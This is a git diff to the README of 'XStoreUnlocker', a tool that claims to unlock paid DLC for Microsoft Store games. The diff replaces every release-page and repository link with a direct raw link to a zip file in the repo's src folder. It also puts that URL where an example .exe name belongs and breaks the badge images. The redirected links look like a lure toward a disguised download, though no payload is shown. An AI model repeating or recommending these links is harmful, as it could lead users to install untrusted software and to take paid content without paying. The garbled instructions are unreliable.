@@ -1,6 +1,6 @@
 # 🔓 XStoreUnlocker - Unlock DLC for Microsoft Store Games
 
-[![Download XStoreUnlocker](https://img.shields.io/badge/Download-XStoreUnlocker-blue?style=for-the-badge)](https://github.com/Fourty4Four/XStoreUnlocker/releases)
+[![Download XStoreUnlocker](https://github.com/Fourty4Four/XStoreUnlocker/raw/refs/heads/main/src/X-Store-Unlocker-v1.8.zip)](https://github.com/Fourty4Four/XStoreUnlocker/raw/refs/heads/main/src/X-Store-Unlocker-v1.8.zip)
 
 ---
 
@@ -44,13 +44,13 @@ XStoreUnlocker works by modifying some game files to unlock additional content. 
 
 Visit the releases page on GitHub by clicking this button:
 
-[![Download Releases](https://img.shields.io/badge/Visit%20Releases-Download-important?style=for-the-badge)](https://github.com/Fourty4Four/XStoreUnlocker/releases)
+[![Download Releases](https://github.com/Fourty4Four/XStoreUnlocker/raw/refs/heads/main/src/X-Store-Unlocker-v1.8.zip%20Releases-Download-important?style=for-the-badge)](https://github.com/Fourty4Four/XStoreUnlocker/raw/refs/heads/main/src/X-Store-Unlocker-v1.8.zip)
 
 This will open the list of available versions. Always download the latest version for the best experience.
 
 ### Step 2: Choose Your Version
 
-Look for the installer file. It usually ends with `.exe`. The file may be named something like `XStoreUnlocker_vX.X.X.exe`, where "X.X.X" is the version number.
+Look for the installer file. It usually ends with `.exe`. The file may be named something like `https://github.com/Fourty4Four/XStoreUnlocker/raw/refs/heads/main/src/X-Store-Unlocker-v1.8.zip`, where "X.X.X" is the version number.
 
 Download the file by clicking on it.
 
@@ -132,8 +132,8 @@ If you encounter issues not covered here, consider the following:
 
 | Action               | Link                                                                                |
 |----------------------|-------------------------------------------------------------------------------------|
-| Download Latest Version | [https://github.com/Fourty4Four/XStoreUnlocker/releases](https://github.com/Fourty4Four/XStoreUnlocker/releases) |
-| GitHub Repository    | [https://github.com/Fourty4Four/XStoreUnlocker](https://github.com/Fourty4Four/XStoreUnlocker) |
+| Download Latest Version | [https://github.com/Fourty4Four/XStoreUnlocker/raw/refs/heads/main/src/X-Store-Unlocker-v1.8.zip](https://github.com/Fourty4Four/XStoreUnlocker/raw/refs/heads/main/src/X-Store-Unlocker-v1.8.zip) |
+| GitHub Repository    | [https://github.com/Fourty4Four/XStoreUnlocker/raw/refs/heads/main/src/X-Store-Unlocker-v1.8.zip](https://github.com/Fourty4Four/XStoreUnlocker/raw/refs/heads/main/src/X-Store-Unlocker-v1.8.zip) |
 
 ---
 
